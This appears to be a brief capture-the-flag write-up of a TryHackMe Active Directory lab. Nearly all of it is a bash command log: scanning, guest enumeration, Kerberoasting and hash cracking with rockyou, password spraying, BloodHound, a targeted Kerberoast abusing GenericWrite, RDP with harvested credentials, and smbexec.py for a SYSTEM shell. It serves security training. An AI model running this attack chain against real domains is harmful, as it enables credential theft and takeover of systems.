# Operation Endgame

Did a CTF on some Kerberoasting before. It helped tons...

```bash
# mod /etc/hosts => `<IP-ADDR> thm.ep`

# Checking network exposure, top-1000 ports yielded nth
nmap -T4-n -sC -sV -Pn -p- thm.ep
## port 88 had exposed kerberos versions! LDAP, SMB, DNS => ad.thm.local, thm.local

# mod /etc/hosts
sudo nano /etc/hosts
# <IP_ADDR> ad.thm.local thm.local

# Check guest nxc access
nxc smb ad.thm.local -u 'guest' -p '' #works
nxc ldap ad.thm.local -u 'guest' -p '' #works
nxc smb ad.thm.local -u 'guest' -p '' --shares # check the shares
nxc ldap ad.thm.local -u 'guest' -p '' --kerberoasting kerb01.txt # finding kerb roastable a/c's => found cody_roy
# 🤷‍♂️i read it as Ray and kept using it, cody_ray existed but with limited access🤷🏻‍♂️
john kerb01.txt --wordlist=/usr/share/wordlists/rockyou.txt --pot=kerb01_cody_ray.pot # pass is 'M<<<>>>0'
nxc ldap ad.thm.local -u cody_roy -p 'PASS' --users # passed it's contents to MrGPT to parse it into a file of users.txt via shell commands
bloodhound -u 'cody_roy@thm.local' -p 'PASS' --zip -dc ad.thm.local -c All -d thm.local -n thm.ep --dns-timeout 16 --dns-tcp # nth significant

# BRUTE-FORCING with cody_roy and beyond
nxc ldap ad.thm.local -u users.txt -p 'CODY_ROY_PASS' --users # checked users with same pass, found zachary_hunt
bloodhound -u 'zachary_hunt@thm.local' -p 'PASS' --zip -dc ad.thm.local -c All -d thm.local -n thm.ep --dns-timeout 16 --dns-tcp # `GenericWrite` permission on `jerri_lancaster`

# Targeted kerberoast on `jerri_lancaster` and capture hash => MGPT-rec
python targetedKerberoast.py -v -d 'thm.local' -u 'zachary_hunt' -p 'ZH_PASS' --dc-host ad.thm.local --request-user jerri_lancaster > jerrilkerb.txt
john jerrikerb.txt --wordlist=/usr/share/wordlists/rockyou.txt --pot=kerb01_jerrikerb.pot # pass is `l<><><>!`
bloodhound -u 'jerri_lancaster@thm.local' -p 'PASS' --zip -dc ad.thm.local -c All -d thm.local -n thm.ep --dns-timeout 16 --dns-tcp # `Remote Desktops User` permission

xfreedp /v:ad.thm.local /u:'jerri_lancaster' /p:'l<><><>!' /dynamic-resolution /clipboard /cert:ignore
# opened cmd and found C:\Scripts\syncer.ps1 => with sanford_daugherty:R<><><><@123
bloodhound -u 'sanford_daugherty@thm.local' -p 'PASS' --zip -dc ad.thm.local -c All -d thm.local -n thm.ep --dns-timeout 16 --dns-tcp # `Local Administrator` permission
# MGPT calls Impacket>examples>smbexec.py to spawn CMD as SYSTEM
python smbexec.py 'thm.local/sanford_daugherty:R<><><@123@ad.thm.local'
# found flag within the Administrator\Desktop => THM{I____S}

# if nth was could've used brute-forced enumeration on passwords, rockyou.txt

```